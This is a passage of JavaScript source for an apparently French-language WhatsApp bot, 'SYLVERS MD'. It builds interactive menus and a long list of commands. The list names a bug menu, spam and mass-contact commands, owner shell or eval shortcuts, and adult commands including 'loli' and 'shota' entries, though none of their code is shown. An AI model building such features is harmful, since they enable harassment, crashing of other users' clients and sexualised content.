          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"},
{"header":"MENU DE RECHERCHE",
"title":"cliquez pour selectionner",
"description":"Afficher le menu de recherche",
"id":"${prefix}menu-recherche"},
{"header":"MENU DE TELECHARGEMENT",
"title":"cliquez pour selectionner",
"description":"Afficher le menu de telechargement",
"id":"${prefix}menu-telechargement"},
{"header":"MENU DE JEUX",
"title":"cliquez pour selectionner",
"description":"Afficher le menu de jeux",
"id":"${prefix}menu-jeux"},
{"header":"MENU FUN",
"title":"cliquez pour selectionner",
"description":"Afficher le menu fun",
"id":"${prefix}menu-fun"},
{"header":"AI MENU",
"title":"cliquez pour selectionner",
"description":"Afficher le menu des ai",
"id":"${prefix}ai-menu"},
{"header":"MENU DE GROUPE",
"title":"cliquez pour selectionner",
"description":"Afficher le menu de groupe",
"id":"${prefix}menu-groupe"},
{"header":"MENU PROPRIO",
"title":"cliquez pour selectionner",
"description":"Afficher le menu du proprio",
"id":"${prefix}menu-proprio"},
{"header":"MENU DE CONVERSION",
"title":"cliquez pour selectionner",
"description":"Afficher le menu de conversion",
"id":"${prefix}menu-conversion"},
{"header":"LISTE MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste des menus",
"id":"${prefix}liste-menu"},
{"header":"MENU -18",
"title":"cliquez pour selectionner",
"description":"Afficher le menu -18",
"id":"${prefix}menu-18"},
{"header":"MENU D ANIME",
"title":"cliquez pour selectionner",
"description":"Afficher le menu anime",
"id":"${prefix}menu-anime"},
{"header":"MENU RANDOM PHOTO",
"title":"cliquez pour selectionner",
"description":"Afficher le menu random photo",
"id":"${prefix}menu-randomphoto"},
{"header":"MENU RANDOM VIDEO",
"title":"cliquez pour selectionner",
"description":"Afficher le menu random video",
"id":"${prefix}menu-randomvideo"},
{"header":"MENU DE STICKER",
"title":"cliquez pour selectionner",
"description":"Afficher le menu sticker",
"id":"${prefix}menu-sticker"},
{"header":"MENU DE LA DATABASE",
"title":"cliquez pour selectionner",
"description":"afficher le menu de la database",
"id":"${prefix}menu-database"},
{"header":"BUG MENU",
"title":"cliquez pour selectionner",
"description":"Afficher le bug menu",
"id":"${prefix}bug-menu"},
{"header":"MENU DIVERS",
"title":"cliquez pour selectionner",
"description":"Afficher la liste du menu divers",
"id":"${prefix}menu-divers"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'tout-menu': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」──╮
│➠ *Hey 🍁?*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰────── ${readmore}
╭── ✣「 *GUIDE* 」✣────╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰─────────────────╯
╭──✣「 *Proprio* 」✣─────╮
│${setv} ╭────────────╮
│${setv} │${prefix}add-grosmot 🅟
│${setv} │${prefix}supp-grosmot 🅟
│${setv} │${prefix}lecture-auto 🅟
│${setv} │${prefix}auto-bio 🅟
│${setv} │${prefix}ecriture-auto 🅟
│${setv} │${prefix}indisponible 🅟
│${setv} │${prefix}reg-auto 🅟
│${setv} │${prefix}reg-ecritureauto 🅟
│${setv} │${prefix}lecturestatut-auto 🅟
│${setv} │${prefix}mod-blocageauto 🅟
│${setv} │${prefix}mod-antiforeign 🅟
│${setv} │${prefix}mod-blocageauto 🅟
│${setv} │${prefix}groupe-unik 🅟
│${setv} │${prefix}pv-unik 🅟
│${setv} │${prefix}anti-appel 🅟
│${setv} │${prefix}privey 🅟
│${setv} │${prefix}publique 🅟
│${setv} │${prefix}rejoindre 🅟
│${setv} │${prefix}poll 🅟
│${setv} │${prefix}spam 🅟
│${setv} │${prefix}bc 🅟
│${setv} │${prefix}bc-groupe 🅟
│${setv} │${prefix}mod-menu 🅟
│${setv} │${prefix}mod-imgmenu 🅟
│${setv} │${prefix}mod-vidmenu 🅟
│${setv} │${prefix}mod-gifmenu 🅟
│${setv} │${prefix}mod-reponse 🅟
│${setv} │${prefix}reset-hit 🅟
│${setv} │${prefix}reset-user 🅟
│${setv} │${prefix}creer-groupe 🅟
│${setv} │${prefix}mod-exif 🅟
│${setv} │${prefix}voir-exif 🅟
│${setv} │${prefix}voir-blocageauto 🅟
│${setv} │${prefix}voir-antiforeign 🅟
│${setv} │${prefix}id 🅟
│${setv} │${prefix}mod-botbio 🅟
│${setv} │${prefix}mod-ppbot 🅟
│${setv} │${prefix} extinction 🅟
│${setv} │${prefix}mod-ppbot 🅟
│${setv} │${prefix}add-boss 🅟
│${setv} │${prefix}supp-boss 🅟
│${setv} │${prefix}add-proprio 🅟
│${setv} │${prefix}supp-proprio 🅟
│${setv} │${prefix}add-vn 🅟
│${setv} │${prefix}add-apk 🅟
│${setv} │${prefix}add-zip 🅟
│${setv} │${prefix}add-pdf 🅟
│${setv} │${prefix}supp-apk 🅟
│${setv} │${prefix}supp-zip 🅟
│${setv} │${prefix}supp-pdf 🅟
│${setv} │${prefix}supp-vn 🅟
│${setv} │${prefix}add-sticker 🅟
│${setv} │${prefix}supp-sticker 🅟
│${setv} │${prefix}add-image 🅟
│${setv} │${prefix}supp-image 🅟
│${setv} │${prefix}add-video 🅟
│${setv} │${prefix}supp-video 🅟
│${setv} │${prefix}statut-texte 🅟
│${setv} │${prefix}statut-video 🅟
│${setv} │${prefix}statut-image 🅟
│${setv} │${prefix}statut-audio 🅟
│${setv} │${prefix}auto-sticker 🅟
│${setv} │${prefix}bloquer 🅟
│${setv} │${prefix}debloquer 🅟
│${setv} │${prefix}quitter 🅟
│${setv} │${prefix}pushcontact 🅟
│${setv} │${prefix}pushcontactv2 🅟
│${setv} │${prefix}pushcontactv3 🅟
│${setv} │${prefix}jpm 🅟
│${setv} │${prefix}checkmember 🅟
│${setv} │${prefix}post 🅟
│${setv} │${prefix}tout-effacer 🅟
│${setv} │${prefix}mod-prefix 🅟
│${setv} │$ 🅟
│${setv} │> 🅟
│${setv} │< 🅟
│${setv} ╰───────────╯
╰──────────────────╯
╭──✣「 *Groupe* 」✣──────╮
│${setv} ╭─────────────╮
│${setv} │${prefix}anti-bot 🅖
│${setv} │${prefix}anti-vuenique 🅖
│${setv} │${prefix}vv 🅖
│${setv} │${prefix}bienvenue 🅖
│${setv} │${prefix}admin-event 🅖
│${setv} │${prefix}group-event 🅖
│${setv} │${prefix}anti-foreign 🅖
│${setv} │${prefix}anti-media 🅖
│${setv} │${prefix}anti-audio 🅖
│${setv} │${prefix}anti-video 🅖
│${setv} │${prefix}anti-image 🅖
│${setv} │${prefix}anti-document 🅖
│${setv} │${prefix}anti-localisation 🅖
│${setv} │${prefix}anti-contact 🅖
│${setv} │${prefix}anti-sticker 🅖
│${setv} │${prefix}anti-poll 🅖
│${setv} │${prefix}antilien 🅖
│${setv} │${prefix}anti-promotion 🅖
│${setv} │${prefix}anti-virtex 🅖
│${setv} │${prefix}lien-groupe 🅖
│${setv} │${prefix}liste-admin 🅖
│${setv} │${prefix}inviter 🅖
│${setv} │${prefix}ephemere 🅖
│${setv} │${prefix}supprimer 🅖
│${setv} │${prefix}modppgroup 🅖
│${setv} │${prefix}supp-ppgroup 🅖
│${setv} │${prefix}mod-namegc 🅖
│${setv} │${prefix}mod-desc 🅖
│${setv} │${prefix}ajouter 🅖
│${setv} │${prefix}kick 🅖
│${setv} │${prefix}nommer 🅖
│${setv} │${prefix}demettre 🅖
│${setv} │${prefix}tous-dehors 🅖
│${setv} │${prefix}nominations 🅖
│${setv} │${prefix}denominations 🅖
│${setv} │${prefix}voir-contact 🅟
│${setv} │${prefix}enregistrer-contact 🅟
│${setv} │${prefix}send-contact 🅟
│${setv} │${prefix}contac-tag 🅟
│${setv} │${prefix}hey 🅖
│${setv} │${prefix}totag 🅖
│${setv} │${prefix}chers-tous 🅖
│${setv} │${prefix}mod-info 🅖
│${setv} │${prefix}ouverture 🅖
│${setv} │${prefix}fermeture 🅖
│${setv} │${prefix}reinitialiser 🅖
│${setv} │${prefix}voir-bio 🅖
│${setv} │${prefix}vote 🅖
│${setv} │${prefix}upvote 🅖
│${setv} │${prefix}downvote 🅖
│${setv} │${prefix}checkvote 🅖
│${setv} │${prefix}delvote 🅖
│${setv} │${prefix}anti-virus 🅖
│${setv} │${prefix}anti-grosmot 🅖
│${setv} │${prefix}-18 🅖
│${setv} │${prefix}react 🅖
│${setv} │${prefix}getjoUSDequest 🅖
│${setv} ╰─────────────╯
╰────────────────────╯
╭──✣「 *Recherche* 」✣───╮
│${setv} ╭────────────╮
│${setv} │${prefix}google 🅡
│${setv} │${prefix}wikipedia 🅡
│${setv} │${prefix}yt-search 🅡
│${setv} │${prefix}xnxx-search 🅡
│${setv} │${prefix}xvideo-search 🅡
│${setv} │${prefix}apk-search 🅡
│${setv} │${prefix}sticker-search 🅡
│${setv} │${prefix}imdb 🅡
│${setv} │${prefix}wanumber 🅡
│${setv} │${prefix}friend 🅡
│${setv} │${prefix}lyrics 🅡
│${setv} │${prefix}pixiv 🅡
│${setv} ╰───────────╯
╰──────────────────╯
╭──✣「 *Telechargement* 」✣─╮
│${setv} ╭────────────╮
│${setv} │${prefix}xnxxdl 🅡
│${setv} │${prefix}xvideodl 🅡
│${setv} │${prefix}itunes 🅡
│${setv} │${prefix}play 🅡
│${setv} │${prefix}ytmp3 🅡
│${setv} │${prefix}ytmp4 🅡
│${setv} │${prefix}tiktok 🅡
│${setv} │${prefix}tiktokaudio 🅡
│${setv} │${prefix}tiktokvideo 🅡
│${setv} │${prefix}igvideo 🅡
│${setv} │${prefix}igimage 🅡
│${setv} │${prefix}facebook 🅡
│${setv} │${prefix}twitter 🅡
│${setv} │${prefix}apk 🅡
│${setv} │${prefix}mega 🅡
│${setv} │${prefix}mediafire 🅡
│${setv} │${prefix}google 🅡
│${setv} │${prefix}gimage 🅡
│${setv} │${prefix}weather 🅡
│${setv} │${prefix}spotify 🅑
│${setv} │${prefix}gitclone 🅡
│${setv} │${prefix}happymod 🅡
│${setv} │${prefix}gdrive 🅡
│${setv} │${prefix}pinterest 🅡
│${setv} │${prefix}ringtone 🅡
│${setv} │${prefix}telechargement-auto 🅟
│${setv} ╰────────────╯
╰───────────────────╯
╭──✣「 *Conversion* 」✣───╮
│${setv} ╭────────────╮
│${setv} │${prefix}obfusquer 🅡
│${setv} │${prefix}styletexte 🅡
│${setv} │${prefix}fliptexte 🅡
│${setv} │${prefix}tts 🅡
│${setv} │${prefix}dis 🅡
│${setv} │${prefix}en-gif 🅡
│${setv} │${prefix}en-qr 🅡
│${setv} │${prefix}bass 🅡
│${setv} │${prefix}blown 🅡
│${setv} │${prefix}deep 🅡
│${setv} │${prefix}earrape 🅡
│${setv} │${prefix}fast 🅡
│${setv} │${prefix}fat 🅡
│${setv} │${prefix}nightcore 🅡
│${setv} │${prefix}reverse 🅡
│${setv} │${prefix}robot 🅡
│${setv} │${prefix}slow 🅡
│${setv} │${prefix}smooth 🅡
│${setv} │${prefix}squirrel 🅡
│${setv} │${prefix}tinyurl 🅡
│${setv} │${prefix}en-vn 🅡
│${setv} │${prefix}t 🅡
│${setv} │${prefix}en-audio 🅡
│${setv} │${prefix}en-mp3 🅡
│${setv} │${prefix}en-mp4🅡
│${setv} │${prefix}en-img 🅡
│${setv} │${prefix}en-vueunique 🅡
│${setv} │${prefix}en-ptv 🅡
│${setv} │${prefix}sticker 🅡
│${setv} │${prefix}smeme 🅡
│${setv} │${prefix}smeta 🅡
│${setv} │${prefix}voler 🅑
│${setv} │${prefix}emoji-mix 🅡
│${setv} │${prefix}vol-audio 🅡
│${setv} │${prefix}vol-video 🅡
│${setv} │${prefix}ebinary 🅡
│${setv} │${prefix}dbinary 🅡
│${setv} │${prefix}ss-web 🅡
│${setv} │${prefix}quoted 🅡
│${setv} │${prefix}traduction 🅡
│${setv} │${prefix}voir 🅡
│${setv} │${prefix}en-url 🅡
│${setv} │${prefix}ecrire 🅡
│${setv} ╰──────────╯
╰─────────────────╯
╭──✣「 *Liste De Menu* 」✣─╮
│${setv} ╭────────────╮
│${setv} │${prefix}liste-boss 🅡
│${setv} │${prefix}liste-proprio 🅡
│${setv} │${prefix}liste-sticker 🅡
│${setv} │${prefix}liste-image 🅡
│${setv} │${prefix}liste-video 🅡
│${setv} │${prefix}liste-vn 🅡
│${setv} │${prefix}liste-apk 🅡
│${setv} │${prefix}liste-zip 🅡
│${setv} │${prefix}liste-pdf 🅡
│${setv} │${prefix}liste-grosmot 🅡
│${setv} │${prefix}liste-pv 🅡
│${setv} │${prefix}liste-groupe 🅡
│${setv} ╰────────────╯
╰───────────────────╯
╭──✣「 *Random Photo* 」✣──╮
│${setv} ╭─────────────╮
│${setv} │${prefix}aesthetic 🅡
│${setv} │${prefix}wikimedia 🅡
│${setv} │${prefix}wallpaper 🅡
│${setv} │${prefix}art 🅡
│${setv} │${prefix}bts 🅡
│${setv} │${prefix}dogwoof 🅡
│${setv} │${prefix}catmeow 🅡
│${setv} │${prefix}lizardpic 🅡
│${setv} │${prefix}goosebird 🅡
│${setv} │${prefix}8ballpool 🅡
│${setv} │${prefix}cosplay 🅡
│${setv} │${prefix}hacker 🅡
│${setv} │${prefix}cyber 🅡
│${setv} │${prefix}gamewallpaper 🅡
│${setv} │${prefix}islamic 🅡
│${setv} │${prefix}jennie 🅡
│${setv} │${prefix}jiso 🅡
│${setv} │${prefix}satanic 🅡
│${setv} │${prefix}justina 🅡
│${setv} │${prefix}cartoon 🅡
│${setv} │${prefix}pentol 🅡
│${setv} │${prefix}cat 🅡
│${setv} │${prefix}kpop 🅡
│${setv} │${prefix}exo 🅡
│${setv} │${prefix}lisa 🅡
│${setv} │${prefix}space 🅡
│${setv} │${prefix}car 🅡
│${setv} │${prefix}technology 🅡
│${setv} │${prefix}bike 🅡
│${setv} │${prefix}shortquote 🅡
│${setv} │${prefix}antiwork 🅡
│${setv} │${prefix}hacking 🅡
│${setv} │${prefix}boneka 🅡
│${setv} │${prefix}rose 🅡
│${setv} │${prefix}ryujin 🅡
│${setv} │${prefix}ulzzangboy 🅡
│${setv} │${prefix}ulzzanggirl 🅡
│${setv} │${prefix}wallml 🅡
│${setv} │${prefix}wallphone 🅡
│${setv} │${prefix}mountain 🅡
│${setv} │${prefix}goose 🅡
│${setv} │${prefix}profilepic 🅡
│${setv} │${prefix}couplepp 🅡
│${setv} │${prefix}programming 🅡
│${setv} │${prefix}pubg 🅡
│${setv} │${prefix}blackpink 🅡
│${setv} │${prefix}randomboy 🅡  
│${setv} │${prefix}randomgirl 🅡
│${setv} │${prefix}hijab 🅡  
│${setv} │${prefix}chinese 🅡
│${setv} │${prefix}indo 🅡
│${setv} │${prefix}japanese 🅡
│${setv} │${prefix}korean 🅡
│${setv} │${prefix}malay 🅡
│${setv} │${prefix}thai 🅡
│${setv} │${prefix}vietnamese 🅡
│${setv} ╰──────────╯
╰─────────────────╯
╭─✣「 *Random Video* 」✣──╮
│${setv} ╭────────────╮
│${setv} │${prefix}tiktokgirl 🅡
│${setv} │${prefix}tiktoknukthy 🅡
│${setv} │${prefix}tiktokkayes 🅡
│${setv} │${prefix}tiktokpanrika 🅡
│${setv} │${prefix}tiktoknotnot 🅡
│${setv} │${prefix}tiktokghea 🅡
│${setv} │${prefix}tiktoksantuy 🅡
│${setv} │${prefix}tiktokbocil 🅡
│${setv} ╰────────────╯
╰───────────────────╯
╭─✣「 *Ai Menu* 」✣──────╮
│${setv} ╭────────────╮
│${setv} │${prefix}blackboxai 🅡
│${setv} │${prefix}travel-assistant 🅡
│${setv} │${prefix}guru-ai 🅡
│${setv} │${prefix}emi-ai 🅡
│${setv} │${prefix}kev-ai 🅡
│${setv} │${prefix}hercai-cartoon 🅡
│${setv} │${prefix}hercai-animefy 🅡
│${setv} │${prefix}hercai-lexica 🅡
│${setv} │${prefix}hercai-prodia 🅡
│${setv} │${prefix}hercai-simurg 🅡
│${setv} │${prefix}hercai-raava 🅡
│${setv} │${prefix}hercai-shonin 🅡
│${setv} │${prefix}realistic 🅡
│${setv} │${prefix}3dmodel 🅡
│${setv} │${prefix}photoleap 🅡
│${setv} │${prefix}openai 🅡
│${setv} │${prefix}dalle 🅡
│${setv} │${prefix}ai 🅡
│${setv} │${prefix}remini 🅡
│${setv} ╰──────────╯
╰─────────────────╯
╭─✣「 *Jeux* 」✣────╮
│${setv} ╭────────╮
│${setv} │${prefix}truth 🅡
│${setv} │${prefix}dare 🅡
│${setv} │${prefix}suit 🅡
│${setv} │${prefix}tictactoe 🅡
│${setv} │${prefix}math 🅡
│${setv} │${prefix}playbomb 🅡
│${setv} │${prefix}casino 🅡
│${setv} │${prefix}rob 🅡
│${setv} │${prefix}slot 🅡
│${setv} │${prefix}dice 🅡 
│${setv} │${prefix} profile 🅡
│${setv} │${prefix} claim 🅡
│${setv} │${prefix} tmoney 🅡
│${setv} │${prefix} tflimit 🅡
│${setv} ╰─────────╯
╰────────────────╯
╭──✣「 *Fun* 」✣────╮
│${setv} ╭─────────╮
│${setv} │${prefix}definir🅡
│${setv} │${prefix}voir-plus 🅡
│${setv} │${prefix}fact 🅡
│${setv} │${prefix}couple 🅡
│${setv} │${prefix}ame-soeur 🅡
│${setv} │${prefix}stupidcheck 🅡
│${setv} │${prefix}handsomecheck 🅡
│${setv} │${prefix}uncleancheck 🅡
│${setv} │${prefix}hotcheck 🅡
│${setv} │${prefix}smartcheck 🅡
│${setv} │${prefix}greatcheck 🅡
│${setv} │${prefix}evilcheck 🅡
│${setv} │${prefix}dogcheck 🅡
│${setv} │${prefix}coolcheck 🅡
│${setv} │${prefix}waifucheck 🅡
│${setv} │${prefix}awesomecheck 🅡
│${setv} │${prefix}gaycheck 🅡
│${setv} │${prefix}cutecheck 🅡
│${setv} │${prefix}lesbiancheck 🅡
│${setv} │${prefix}hornycheck 🅡
│${setv} │${prefix}prettycheck 🅡
│${setv} │${prefix}lovelycheck 🅡
│${setv} │${prefix}uglycheck 🅡
│${setv} │${prefix}pick 🅡
│${setv} │${prefix}pickupline 🅡
│${setv} │${prefix}quotes 🅡
│${setv} │${prefix}can 🅡
│${setv} │${prefix}is 🅡
│${setv} │${prefix}when 🅡
│${setv} │${prefix}where 🅡
│${setv} │${prefix}what 🅡
│${setv} │${prefix}how 🅡
│${setv} │${prefix}rate 🅡
│${setv} │${prefix}cry 🅡
│${setv} │${prefix}kill 🅡
│${setv} │${prefix}hug 🅡
│${setv} │${prefix}pat 🅡
│${setv} │${prefix}lick 🅡 
│${setv} │${prefix}kiss 🅡
│${setv} │${prefix}bite 🅡
│${setv} │${prefix}yeet 🅡
│${setv} │${prefix}bully 🅡
│${setv} │${prefix}bonk 🅡
│${setv} │${prefix}wink 🅡
│${setv} │${prefix}poke 🅡
│${setv} │${prefix}nom 🅡
│${setv} │${prefix}slap 🅡
│${setv} │${prefix}smile 🅡 
│${setv} │${prefix}wave 🅡
│${setv} │${prefix}awoo 🅡
│${setv} │${prefix}blush 🅡
│${setv} │${prefix}smug 🅡
│${setv} │${prefix}glomp 🅡 
│${setv} │${prefix}happy 🅡
│${setv} │${prefix}dance 🅡
│${setv} │${prefix}cringe 🅡
│${setv} │${prefix}cuddle 🅡
│${setv} │${prefix}highfive 🅡 
│${setv} │${prefix}handhold 🅡
│${setv} │${prefix}spank 🅡
│${setv} │${prefix}tickle 🅡
│${setv} │${prefix}feed 🅡
│${setv} │${prefix}checkme 🅡
│${setv} ╰─────────╯
╰─────────────────╯
╭─✣「 *Sticker* 」✣───╮
│${setv} ╭─────────╮
│${setv} │${prefix}goose 🅡
│${setv} │${prefix}woof 🅡
│${setv} │${prefix}8ball 🅡
│${setv} │${prefix}lizard 🅡
│${setv} │${prefix}meow 🅡
│${setv} │${prefix}gura 🅡
│${setv} │${prefix}telestick 🅡
│${setv} ╰────────╯
╰───────────────╯
╭─✣「 *Anime* 」✣──────╮
│${setv} ╭───────────╮
│${setv} │${prefix}stickhandhold 🅡
│${setv} │${prefix}stickshinobu 🅡
│${setv} │${prefix}stickcuddle 🅡
│${setv} │${prefix}stickhighfive 🅡
│${setv} │${prefix}stickdance 🅡
│${setv} │${prefix}stickcringe 🅡
│${setv} │${prefix}stickhappy 🅡
│${setv} │${prefix}stickglomp 🅡
│${setv} │${prefix}sticksmug 🅡
│${setv} │${prefix}stickblush 🅡
│${setv} │${prefix}stickawoo 🅡
│${setv} │${prefix}stickwave 🅡
│${setv} │${prefix}sticksmile 🅡
│${setv} │${prefix}stickslap 🅡
│${setv} │${prefix}stickpoke 🅡
│${setv} │${prefix}stickwink 🅡
│${setv} │${prefix}stickbonk 🅡
│${setv} │${prefix}stickbully 🅡
│${setv} │${prefix}stickyeet 🅡
│${setv} │${prefix}stickbike 🅡
│${setv} │${prefix}stickkiss 🅡
│${setv} │${prefix}sticklick 🅡
│${setv} │${prefix}stickpat 🅡
│${setv} │${prefix}stickhug 🅡
│${setv} │${prefix}stickkill 🅡
│${setv} │${prefix}stickcry 🅡
│${setv} │${prefix}stickspank 🅡
│${setv} │${prefix}sticktickle 🅡
│${setv} │${prefix}traceanime 🅡
│${setv} │${prefix}akira 🅡
│${setv} │${prefix}akiyama 🅡
│${setv} │${prefix}ana 🅡
│${setv} │${prefix}asuna 🅡
│${setv} │${prefix}ayuzawa 🅡
│${setv} │${prefix}boruto 🅡
│${setv} │${prefix}chiho 🅡
│${setv} │${prefix}chitoge 🅡
│${setv} │${prefix}cosplayloli 🅡
│${setv} │${prefix}cosplaysagiri 🅡
│${setv} │${prefix}deidara 🅡
│${setv} │${prefix}doraemon 🅡
│${setv} │${prefix}elaina 🅡
│${setv} │${prefix}emilia 🅡
│${setv} │${prefix}erza 🅡
│${setv} │${prefix}gremory 🅡
│${setv} │${prefix}hestia 🅡
│${setv} │${prefix}husbu 🅡
│${setv} │${prefix}inori 🅡
│${setv} │${prefix}isuzu 🅡
│${setv} │${prefix}itachi 🅡
│${setv} │${prefix}itori 🅡
│${setv} │${prefix}kaga 🅡
│${setv} │${prefix}kagura 🅡
│${setv} │${prefix}kakasih 🅡
│${setv} │${prefix}kaori 🅡
│${setv} │${prefix}keneki 🅡
│${setv} │${prefix}kotori 🅡
│${setv} │${prefix}kurumi 🅡
│${setv} │${prefix}loli 🅡
│${setv} │${prefix}loli2 🅡
│${setv} │${prefix}madara 🅡
│${setv} │${prefix}megumin 🅡
│${setv} │${prefix}mikasa 🅡
│${setv} │${prefix}mikey 🅡
│${setv} │${prefix}miku 🅡
│${setv} │${prefix}minato 🅡
│${setv} │${prefix}naruto 🅡
│${setv} │${prefix}neko 🅡
│${setv} │${prefix}nekonime 🅡
│${setv} │${prefix}nezuko 🅡
│${setv} │${prefix}onepiece 🅡
│${setv} │${prefix}pokemon 🅡
│${setv} │${prefix}randomnime 🅡
│${setv} │${prefix}randomnime2 🅡
│${setv} │${prefix}rize 🅡
│${setv} │${prefix}sagiri 🅡
│${setv} │${prefix}sakura 🅡
│${setv} │${prefix}sasuke 🅡
│${setv} │${prefix}shina 🅡
│${setv} │${prefix}shinka 🅡
│${setv} │${prefix}shinomiya 🅡
│${setv} │${prefix}shizuka 🅡
│${setv} │${prefix}shota 🅡
│${setv} │${prefix}tejina 🅡
│${setv} │${prefix}toukachan 🅡
│${setv} │${prefix}tsunade 🅡
│${setv} │${prefix}waifu 🅡
│${setv} │${prefix}waifu2 🅡
│${setv} │${prefix}animewall 🅡
│${setv} │${prefix}yotsuba 🅡
│${setv} │${prefix}yuki 🅡
│${setv} │${prefix}yulibocil 🅡
│${setv} │${prefix}yumeko 🅡
│${setv} │${prefix}8ball 🅡
│${setv} │${prefix}animeawoo 🅡
│${setv} │${prefix}animemegumin 🅡
